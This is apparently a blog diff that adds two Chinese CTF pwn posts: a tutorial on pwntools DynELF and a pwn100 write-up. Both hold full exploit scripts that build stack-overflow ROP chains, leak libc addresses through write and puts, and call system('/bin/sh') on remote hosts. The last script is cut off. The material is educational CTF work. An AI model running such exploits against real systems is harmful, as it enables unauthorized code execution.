@@ -251,6 +251,322 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/19/linux pwn入门教程/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xfgg">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xfgg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/09/19/linux pwn入门教程/" itemprop="url">dynelf详细教程</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-19T15:21:57+08:00">
+                2019-09-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/百度学习/" itemprop="url" rel="index">
+                    <span itemprop="name">百度学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-DynELF简介"><a href="#0x01-DynELF简介" class="headerlink" title="0x01 DynELF简介"></a>0x01 DynELF简介</h3><h3 id="DynELF简介"><a href="#DynELF简介" class="headerlink" title="DynELF简介"></a>DynELF简介</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">在前面几篇文章中，为了降低难度，很多通过调用库函数system的题目我们实际上都故意留了后门或者提供了目标系统的libc版本。我们知道，不同版本的libc，函数首地址相对于文件开头的偏移和函数间的偏移不一定一致。所以如果题目不提供libc，通过泄露任意一个库函数地址计算出system函数地址的方法就不好使了。这就要求我们想办法获取目标系统的libc。</span><br><span class="line"></span><br><span class="line">关于远程获取libc，**pwn**tools在早期版本就提供了一个解决方案——DynELF类。DynELFl的官方文档见此：http://docs.pwntools.com/en/stable/dynelf.html，其具体的原理可以参阅文档和源码。简单地说，DynELF通过程序漏洞泄露出任意地址内容，结合ELF文件的结构特征获取对应版本文件并计算比对出目标符号在内存中的地址。DynELF类的使用方法如下：</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">       payload2leak_addr = “****” + pack(addr) + “****”</span><br><span class="line">       io.send(payload2leak_addr)</span><br><span class="line">       data = io.recv()</span><br><span class="line">       <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)</span><br><span class="line">system_addr = d.lookup(“system”, libc)</span><br><span class="line"></span><br><span class="line">使用DynELF时，我们需要使用一个leak函数作为必选参数，指向ELF文件的指针或者使用ELF类加载的目标文件至少提供一个作为可选参数，以初始化一个DynELF类的实例d。然后就可以通过这个实例d的方法lookup来搜寻libc库函数了。其中，leak函数需要使用目标程序本身的漏洞泄露出由DynELF类传入的int型参数addr对应的内存地址中的数据。且由于DynELF会多次调用leak函数，这个函数必须能任意次使用，即不能泄露几个地址之后就导致程序崩溃。由于需要泄露数据，payload中必然包含着打印函数，如write, puts, printf等，我们根据这些函数的特点将其分成两部分分别进行讲解。</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-DynELF的使用—write函数"><a href="#0x02-DynELF的使用—write函数" class="headerlink" title="0x02 DynELF的使用—write函数"></a>0x02 DynELF的使用—write函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们先来看比较简单的write函数。write函数的特点在于其输出完全由其参数size决定，只要目标地址可读，size填多少就输出多少，不会受到诸如‘\<span class="number">0</span>’, ‘\n’之类的字符影响。因此leak函数中对数据的读取和处理较为简单。</span><br><span class="line">       我们开始分析例子~/PlaidCTF <span class="number">2013</span> ropasaurusrex/ropasaurusrex. 这个<span class="number">32</span>位程序的结构非常简单，一个有栈溢出的read，一个write。没有libc，got表里没有system，也没有int <span class="number">80</span>h/syscall</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201807/17/144155x77lrl6oaserzwlo.png.thumb.jpg" alt></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">这种情况下我们就可以使用DynELF来leaklibc，进而获取system函数在内存中的地址。</span><br><span class="line">首先我们来构建一个可以泄露任意地址的ROP链。通过测试我们可以知道栈溢出到EIP需要<span class="number">140</span>个字节，因此我们可以构造一个payload如下：</span><br><span class="line">elf = ELF(‘./ropasaurusrex’)         <span class="comment">#别忘了在脚本所在目录下放一个程序文件ropasaurusrex</span></span><br><span class="line"> </span><br><span class="line">write_addr = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line"> </span><br><span class="line">payload = “A”*<span class="number">140</span></span><br><span class="line">payload += p32(write_addr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(<span class="number">0x08048000</span>)</span><br><span class="line">payload += p32(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">使用payload打印出ELF文件在内存中的首地址<span class="number">0x08048000</span>，write()运行结束后返回的地址随便填写，编写脚本后发现可以正确输出结果：</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201807/17/144223jbxb1vpxrk98w9rk.png.thumb.jpg" alt></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">现在我们需要让这个payload可以被重复使用。首先我们需要改掉write函数返回的地址，以免执行完write之后程序崩溃。那么改成什么好呢？继续改成write是不行的，因为参数显然没办法继续传递。如果使用pop清除栈又会导致栈顶下降，多执行几次就会耗尽栈空间。这里我们可以把返回地址改成start段的地址</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201807/17/144300dxzrzxmvn8vubxnv.png.thumb.jpg" alt></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">这段代码是编译器添加的，用于初始化程序的运行环境后，执行完相应的代码后会跳转到程序的入口函数main运行程序代码。因此，在执行完write函数泄露数据后，我们可以返回到这里刷新一遍程序的环境，相当于是重新执行了一遍程序。现在的payload封装成leak函数如下</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">       payload = <span class="string">''</span></span><br><span class="line">       payload += <span class="string">'A'</span>*<span class="number">140</span>                   <span class="comment">#padding</span></span><br><span class="line">       payload += p32(write_addr)      <span class="comment">#调用write</span></span><br><span class="line">       payload += p32(start_addr) <span class="comment">#write返回到start</span></span><br><span class="line">       payload += p32(<span class="number">1</span>)                    <span class="comment">#write第一个参数fd</span></span><br><span class="line">       payload += p32(addr)        <span class="comment">#write第二个参数buf</span></span><br><span class="line">       payload += p32(<span class="number">8</span>)                    <span class="comment">#write第三个参数size</span></span><br><span class="line">       io.sendline(payload)</span><br><span class="line">       content = io.recv()[:<span class="number">8</span>]</span><br><span class="line">       print(<span class="string">"%#x -&gt; %s"</span> %(addr, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">       <span class="keyword">return</span> content</span><br><span class="line">我们加了一行<span class="keyword">print</span>输出leak执行的状态，用于debug。使用DynELF泄露system函数地址，显示如下：</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201807/17/144328u04xa59a0hm74v7t.png.thumb.jpg" alt></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">我们可以利用这个DynELF类的实例泄露read函数的真正内存地址，用于读取”/bin/sh”字符串到内存中，以便于执行system(“/bin/sh”)。最终脚本如下：</span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8[/size][/align][align=left][size=3]</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">io = remote(<span class="string">'172.17.0.2'</span>, <span class="number">10001</span>)[/size][/align][align=left][size=<span class="number">3</span>]</span><br><span class="line">elf = ELF(<span class="string">'./ropasaurusrex'</span>)</span><br><span class="line"> </span><br><span class="line">start_addr = <span class="number">0x08048340</span></span><br><span class="line">write_addr = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">binsh_addr = <span class="number">0x08049000</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">       payload = <span class="string">''</span></span><br><span class="line">       payload += <span class="string">'A'</span>*<span class="number">140</span>                   <span class="comment">#padding</span></span><br><span class="line">       payload += p32(write_addr)      <span class="comment">#调用write</span></span><br><span class="line">       payload += p32(start_addr)        <span class="comment">#write返回到start</span></span><br><span class="line">       payload += p32(<span class="number">1</span>)                    <span class="comment">#write第一个参数fd</span></span><br><span class="line">       payload += p32(addr)               <span class="comment">#write第二个参数buf</span></span><br><span class="line">       payload += p32(<span class="number">8</span>)                    <span class="comment">#write第三个参数size</span></span><br><span class="line">       io.sendline(payload)</span><br><span class="line">       content = io.recv()[:<span class="number">8</span>]</span><br><span class="line">       print(<span class="string">"%#x -&gt; %s"</span> %(addr, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">       <span class="keyword">return</span> content</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, elf = elf)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">read_addr = d.lookup(<span class="string">'read'</span>, <span class="string">'libc'</span>)</span><br><span class="line"> </span><br><span class="line">log.info(<span class="string">"system_addr = %#x"</span>, system_addr)</span><br><span class="line">log.info(<span class="string">"read_addr = %#x"</span>, read_addr)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">140</span>                          <span class="comment">#padding</span></span><br><span class="line">payload += p32(read_addr)              <span class="comment">#调用read</span></span><br><span class="line">payload += p32(system_addr)          <span class="comment">#read返回到system</span></span><br><span class="line">payload += p32(<span class="number">0</span>)                           <span class="comment">#read第一个参数fd/system返回地址，无意义</span></span><br><span class="line">payload += p32(binsh_addr)             <span class="comment">#read第二个参数buf/system第一个参数</span></span><br><span class="line">payload += p32(<span class="number">8</span>)                           <span class="comment">#read第三个参数size</span></span><br><span class="line"> </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-DynELF的使用—其他输出函数"><a href="#0x03-DynELF的使用—其他输出函数" class="headerlink" title="0x03 DynELF的使用—其他输出函数"></a>0x03 DynELF的使用—其他输出函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">除了“好说话”的write函数之外，一些专门由于处理字符串输出的函数也经常出现在各类CTF pwn题目中，比如printf, puts等。这类函数的特点是会被特殊字符影响，因此存在输出长度不固定的问题。针对这种函数，我们可以参考这篇博文：https://www.anquanke.com/post/id/<span class="number">85129</span> 对leak函数的接收输出部分进行调整。我们看一下例子~/LCTF <span class="number">2016</span>-pwn100/pwn100，其漏洞出现在sub_40068E()中。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201807/17/144358ezazrqjemm1faaa3.png.thumb.jpg" alt></p>
+<p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201807/17/144426bai3is0hmn81iga1.png.thumb.jpg" alt></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">很明显的栈溢出漏洞。</span><br><span class="line">这个程序比较麻烦的一点在于它是个<span class="number">64</span>位程序，且找不到可以修改rdx的gadget，因此在这里我们就可以用到之前的文章中提到的万能gadgets进行函数调用。</span><br><span class="line">首先我们来构造一个leak函数。通过对代码的分析我们发现程序中可以用来泄露信息的函数只有一个puts，已知栈溢出到rip需要<span class="number">72</span>个字节，我们很快就可以写出一个尝试泄露的脚本：</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">io = remote(<span class="string">"172.17.0.3"</span>, <span class="number">10001</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn100"</span>)</span><br><span class="line"> </span><br><span class="line">puts_addr = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400763</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">"A"</span> *<span class="number">72</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">payload += p64(puts_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">"B"</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="keyword">print</span> io.recv()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201807/17/144451gi2x2llce11x1s91.png.thumb.jpg" alt></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">由于实际上栈溢出漏洞需要执行完puts(“bye~”)之后才会被触发，输出对应地址的数据，因此我们需要去掉前面的字符，所以可以写leak函数如下：</span><br><span class="line">start_addr = <span class="number">0x400550</span></span><br><span class="line">pop_rdi = <span class="number">0x400763</span></span><br><span class="line">puts_addr = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">       payload = <span class="string">"A"</span> *<span class="number">72</span></span><br><span class="line">       payload += p64(pop_rdi)</span><br><span class="line">       payload += p64(addr)</span><br><span class="line">       payload += p64(puts_addr)</span><br><span class="line">       payload += p64(start_addr)</span><br><span class="line">       payload = payload.ljust(<span class="number">200</span>, <span class="string">"B"</span>)</span><br><span class="line">       io.send(payload)</span><br><span class="line">       content = io.recv()[<span class="number">5</span>:]</span><br><span class="line">       log.info(<span class="string">"%#x =&gt; %s"</span> % (addr, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">       <span class="keyword">return</span> content</span><br><span class="line"> 我们将其扩展成一个脚本并执行，却发现leak出错了。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201807/17/144516fcfb4jpzy446z5y4.png.thumb.jpg" alt></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">通过查看输出的leak结果我们可以发现有大量的地址输出处理之后都是<span class="number">0x0a</span>，即一个回车符。从Traceback上看，最根本原因是读取数据错误。这是因为puts()的输出是不受控的，作为一个字符串输出函数，它默认把字符’\x00’作为字符串结尾，从而截断了输出。因此，我们可以根据上述博文修改leak函数:</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">       count = <span class="number">0</span></span><br><span class="line">       up = <span class="string">''</span></span><br><span class="line">       content = <span class="string">''</span></span><br><span class="line">       payload = <span class="string">'A'</span>*<span class="number">72</span>                        <span class="comment">#padding</span></span><br><span class="line">       payload += p64(pop_rdi)                  <span class="comment">#给puts()赋值</span></span><br><span class="line">       payload += p64(addr)               <span class="comment">#leak函数的参数addr</span></span><br><span class="line">       payload += p64(puts_addr)        <span class="comment">#调用puts()函数</span></span><br><span class="line">       payload += p64(start_addr)       <span class="comment">#跳转到start，恢复栈</span></span><br><span class="line">       payload = payload.ljust(<span class="number">200</span>, <span class="string">'B'</span>) <span class="comment">#padding</span></span><br><span class="line">       io.send(payload)</span><br><span class="line">       io.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:                                                      <span class="comment">#无限循环读取，防止recv()读取输出不全</span></span><br><span class="line">              c = io.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.1</span>)     <span class="comment">#每次读取一个字节，设置超时时间确保没有遗漏</span></span><br><span class="line">              count += <span class="number">1</span>                                            </span><br><span class="line">              <span class="keyword">if</span> up == <span class="string">'\n'</span> <span class="keyword">and</span> c == <span class="string">""</span>:                  <span class="comment">#上一个字符是回车且读不到其他字符，说明读完了</span></span><br><span class="line">                     content = content[:<span class="number">-1</span>]+<span class="string">'\x00'</span>    <span class="comment">#最后一个字符置为\x00</span></span><br><span class="line">                     <span class="keyword">break</span></span><br><span class="line">              <span class="keyword">else</span>:</span><br><span class="line">                     content += c <span class="comment">#拼接输出</span></span><br><span class="line">                     up = c    <span class="comment">#保存最后一个字符</span></span><br><span class="line">       content = content[:<span class="number">4</span>]   <span class="comment">#截取输出的一段作为返回值，提供给DynELF处理</span></span><br><span class="line">       log.info(<span class="string">"%#x =&gt; %s"</span> % (addr, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">       <span class="keyword">return</span> content</span><br></pre></td></tr></table></figure>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/17/pwn100/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xfgg">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xfgg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/09/17/pwn100/" itemprop="url">pwn100</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-17T15:38:49+08:00">
+                2019-09-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/攻防世界/" itemprop="url" rel="index">
+                    <span itemprop="name">攻防世界</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="源码漏洞点"><a href="#源码漏洞点" class="headerlink" title="源码漏洞点"></a>源码漏洞点</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int sub_40068E()</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // [rsp+<span class="number">0</span>h] [rbp<span class="number">-40</span>h]</span><br><span class="line"></span><br><span class="line">  sub_40063D((__int64)&amp;v1, <span class="number">200</span>);</span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">"bye~"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall sub_40063D(__int64 a1, signed int a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  signed int i; // [rsp+<span class="number">1</span>Ch] [rbp<span class="number">-4</span>h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (unsigned int)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    read(<span class="number">0</span>, (void *)(i + a1), <span class="number">1</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">栈溢出漏洞</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">无libc  无system 无bin/sh</span><br><span class="line">xfgg@ubuntu:~/Downloads$ ROPgadget --binary pwn100 --only &apos;pop|ret&apos;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040075c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040075e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400760 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400762 : pop r15 ; ret</span><br><span class="line">0x000000000040075b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040075f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400595 : pop rbp ; ret</span><br><span class="line">0x0000000000400763 : pop rdi ; ret</span><br><span class="line">0x0000000000400761 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040075d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004e1 : ret</span><br><span class="line">0x00000000004005c5 : ret 0xc148</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 12</span><br><span class="line"></span><br><span class="line">puts只需要一个参数，所以找到pop rdi; ret传参更方便</span><br><span class="line">0x0000000000400763 : pop rdi ; ret</span><br><span class="line"></span><br><span class="line">找到可写入bin/sh的地址</span><br><span class="line">gdb-peda$ vmmap</span><br><span class="line">Warning: not running</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line">0x004004c8         0x0040077d         rx-p	/home/xfgg/Downloads/pwn100</span><br><span class="line">0x00400238         0x00400904         r--p	/home/xfgg/Downloads/pwn100</span><br><span class="line">0x00600e10         0x00601068         rw-p	/home/xfgg/Downloads/pwn100</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">54701</span>)</span><br><span class="line"><span class="comment">#io = process("./pwn100")</span></span><br><span class="line">elf = ELF(<span class="string">"/home/xfgg/Downloads/pwn100"</span>)</span><br><span class="line"></span><br><span class="line">rop1 = <span class="number">0x40075A</span> <span 